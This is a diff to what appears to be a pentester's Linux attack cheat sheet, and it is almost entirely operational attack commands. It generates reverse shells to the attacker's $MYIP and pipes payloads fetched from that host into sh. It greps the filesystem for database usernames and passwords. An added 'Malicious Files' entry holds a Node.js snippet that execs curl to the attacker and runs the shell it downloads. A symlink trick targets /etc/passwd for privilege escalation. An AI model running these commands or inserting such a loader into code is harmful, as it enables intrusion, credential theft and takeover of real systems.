@@ -1345,7 +1345,7 @@ scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 88
 ## Linux
 [*] Initial Shell
 +---------- Generate resh ----------+
-python3 /Upload/resh.py $MYIP 5555 /Upload/resh
+resh.py $MYIP 5555 /Upload/resh; resh.py $MYIP 5566 /Upload/resh_5566
 
 +---------- Execute resh ----------+
 curl -s http://$MYIP:8888/resh | sh
@@ -1361,6 +1361,9 @@ curl -s http://$MYIP:8888/linux/linpeas.sh | sh
 wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
 
 [*] Privilege Escalation
++---------- Generate resh ----------+
+resh.py $MYIP 5555 /Upload/resh; resh.py $MYIP 5566 /Upload/resh_5566
+
 +---------- Priv Check ----------+
 curl -s http://$MYIP:8888/whoami.sh | sh
 
@@ -1376,6 +1379,10 @@ find / -group developer 2>/dev/null
 
 +---------- Find Usernames + Passwords ----------+
 (grep -IrinE '^\s*db[-_]?user\w*\s*=\s*|^\s*db[-_]?pass\w*\s*=\s*' / 2>/dev/null &)
+
++---------- Malicious Files ----------+
+-->> .js
+echo 'const { exec } = require('child_process');\nexec('curl $MYIP:8888/resh_5566|sh', (err, stdout, stderr) => {});
 
 +---------- Symlink: Writeable Root File ----------+
 ln -sf /etc/passwd /var/log/below/error_root.log
